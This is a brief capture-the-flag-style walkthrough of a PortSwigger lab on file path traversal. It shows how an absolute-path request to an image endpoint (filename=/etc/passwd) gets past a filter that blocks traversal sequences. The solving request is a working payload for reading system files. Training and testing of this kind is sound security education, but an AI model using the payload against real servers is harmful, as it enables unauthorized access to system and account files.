
# File path traversal, traversal sequences blocked with absolute path bypass

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.

---------------------------------------------

References: 

- https://portswigger.net/web-security/file-path-traversal



![img](images/File%20path%20traversal,%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass/1.png)

---------------------------------------------

To retrieve an image the application uses a GET request with the parameter filename:



![img](images/File%20path%20traversal,%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass/2.png)


To retrieve /etc/passwd:

```
GET /image?filename=/etc/passwd 
```



![img](images/File%20path%20traversal,%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass/3.png)